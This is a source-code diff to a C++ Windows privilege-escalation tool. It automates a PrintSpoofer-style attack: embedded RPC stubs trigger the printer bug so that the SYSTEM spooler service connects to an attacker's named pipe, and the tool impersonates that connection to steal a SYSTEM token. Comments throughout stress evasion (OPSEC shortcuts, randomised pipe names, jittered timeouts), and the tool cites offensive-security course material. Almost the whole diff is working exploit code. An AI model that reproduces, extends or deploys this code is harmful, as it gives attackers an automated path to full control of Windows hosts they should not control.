@@ -6,6 +6,26 @@
 #include <iomanip>
 #include <random>
 
+// Trigger from embedded PrintSpoofer stub
+extern "C" DWORD TriggerPrinterBug(LPWSTR pwszPipeName);
+
+// Thread parameter for async trigger
+struct TriggerThreadParam {
+    std::wstring pipeName;
+};
+
+// Thread procedure for async RPC trigger
+static DWORD WINAPI TriggerThreadProc(LPVOID lpParam) {
+    TriggerThreadParam* param = (TriggerThreadParam*)lpParam;
+    if (!param) return 1;
+
+    // Call RPC trigger (this may take several seconds)
+    DWORD result = TriggerPrinterBug((LPWSTR)param->pipeName.c_str());
+    
+    delete param;
+    return result;
+}
+
 #pragma comment(lib, "advapi32.lib")
 #pragma comment(lib, "userenv.lib")
 #pragma comment(lib, "rpcrt4.lib")
@@ -53,19 +73,27 @@ SeImpersonateHandler::~SeImpersonateHandler() {
  * DOES NOT handle payload injection (ProcessInjection class does that)
  * This keeps the module focused: just escalate and return token
  */
-bool SeImpersonateHandler::Execute(HANDLE& outSystemToken) {
+bool SeImpersonateHandler::Execute(HANDLE& outSystemToken, const std::string& customPipeName) {
     // Note: We don't check SeImpersonate privilege explicitly (OPSEC: avoid unnecessary API calls)
     // The exploitation either works (token obtained) or fails (detection by WaitForPipeConnection timeout)
     // One-shot: Success is visible in the result, failure is visible in timeout
 
-    // Step 1: Generate random pipe name (UUID-based, OPSEC-safe, not hardcoded 'test')
-    if (!GenerateRandomPipeName(pipeName)) {
-        std::cerr << "[-] Failed to generate random pipe name\n";
-        return false;
-    }
-    if (verbose) {
-        std::cout << "[*] Generated random pipe name (UUID):\n"
-                  << "    " << pipeName << "\n";
+    // Step 1: Generate random pipe name OR use provided one
+    if (!customPipeName.empty()) {
+        pipeName = customPipeName;
+        if (verbose) {
+            std::cout << "[*] Using provided pipe name (UUID):\n"
+                      << "    " << pipeName << "\n";
+        }
+    } else {
+        if (!GenerateRandomPipeName(pipeName)) {
+            std::cerr << "[-] Failed to generate random pipe name\n";
+            return false;
+        }
+        if (verbose) {
+            std::cout << "[*] Generated random pipe name (UUID):\n"
+                      << "    " << pipeName << "\n";
+        }
     }
 
     // Step 2: Create named pipe server
@@ -75,11 +103,15 @@ bool SeImpersonateHandler::Execute(HANDLE& outSystemToken) {
     }
     std::cout << "[+] Named pipe listening...\n";
 
-    // Step 3: Display trigger instructions (external SpoolSample for Phase 1)
-    if (verbose) std::cout << "[*] Printer bug trigger instructions:\n";
-    if (!TriggerPrinterBugExternal(pipeName)) {
-        if (verbose) std::cerr << "[-] Warning: Failed to output trigger instructions\n";
+    // Step 3: Trigger the printer bug locally via embedded RPC stubs (async thread)
+    if (verbose) std::cout << "[*] Triggering printer bug via embedded RPC call...\n";
+    if (!TriggerPrinterBugInternal(pipeName)) {
+        std::cerr << "[-] Failed to spawn RPC trigger thread\n";
+        return false;
     }
+
+    // Give the RPC call a moment to initiate before we start waiting
+    Sleep(500);
 
     // Step 4: Wait for connection from SYSTEM (spoolsv.exe) with jitter timeout
     DWORD actualTimeout = GetTimeoutWithJitter();
@@ -243,8 +275,15 @@ bool SeImpersonateHandler::WaitForPipeConnection(DWORD timeoutMs) {
     ol.hEvent = hPipeEvent;
 
     // Try to connect (async)
+    // Note: ERROR_PIPE_CONNECTED means client connected between CreateNamedPipe and ConnectNamedPipe
+    // This is considered SUCCESS and we should proceed
     if (!ConnectNamedPipe(hNamedPipe, &ol)) {
         DWORD err = GetLastError();
+        if (err == ERROR_PIPE_CONNECTED) {
+            // Client already connected - this is success!
+            if (verbose) std::cout << "[+] Client already connected (ERROR_PIPE_CONNECTED)\n";
+            return true;
+        }
         if (err != ERROR_IO_PENDING) {
             if (verbose) std::cerr << "[-] ConnectNamedPipe() failed: " << err << "\n";
             return false;
@@ -401,10 +440,7 @@ bool SeImpersonateHandler::SpawnProcessWithToken(HANDLE hSystemToken, DWORD& out
 }
 
 /**
- * Trigger printer bug externally (Phase 1 - external SpoolSample)
- * Displays instructions for attacker to trigger RPC coercion
- * Based on OSEP 16.2.2 course material
- * Phase 2 will use embedded DLL to trigger internally
+ * Trigger printer bug externally (legacy helper)
  */
 bool SeImpersonateHandler::TriggerPrinterBugExternal(const std::string& pipeName) {
     std::cout << "\n";
@@ -418,6 +454,39 @@ bool SeImpersonateHandler::TriggerPrinterBugExternal(const std::string& pipeName
     std::cout << "  - spoolsv.exe (SYSTEM) will connect to our named pipe\n";
     std::cout << "  - We impersonate and steal SYSTEM token\n";
     std::cout << "==========================================================\n\n";
+    return true;
+}
+
+// Trigger using embedded RPC stubs (no external tooling required)
+// Spawns async thread so RPC calls don't block the pipe wait
+bool SeImpersonateHandler::TriggerPrinterBugInternal(const std::string& pipeName) {
+    if (verbose) std::cout << "[*] Spawning RPC trigger thread...\n";
+
+    // Convert pipe name (UUID) to wide string
+    int wideLen = MultiByteToWideChar(CP_ACP, 0, pipeName.c_str(), -1, nullptr, 0);
+    if (wideLen <= 1) {
+        std::cerr << "[-] MultiByteToWideChar size check failed\n";
+        return false;
+    }
+
+    // Allocate param structure (thread will delete it)
+    TriggerThreadParam* param = new TriggerThreadParam();
+    param->pipeName.resize(wideLen);
+    if (MultiByteToWideChar(CP_ACP, 0, pipeName.c_str(), -1, &param->pipeName[0], wideLen) == 0) {
+        std::cerr << "[-] MultiByteToWideChar conversion failed: " << GetLastError() << "\n";
+        delete param;
+        return false;
+    }
+
+    // Create thread for RPC trigger (async - don't block)
+    hTriggerThread = CreateThread(NULL, 0, TriggerThreadProc, param, 0, NULL);
+    if (hTriggerThread == NULL) {
+        std::cerr << "[-] CreateThread failed: " << GetLastError() << "\n";
+        delete param;
+        return false;
+    }
+
+    if (verbose) std::cout << "[+] RPC trigger thread spawned (TID: " << GetThreadId(hTriggerThread) << ")\n";
     return true;
 }
 
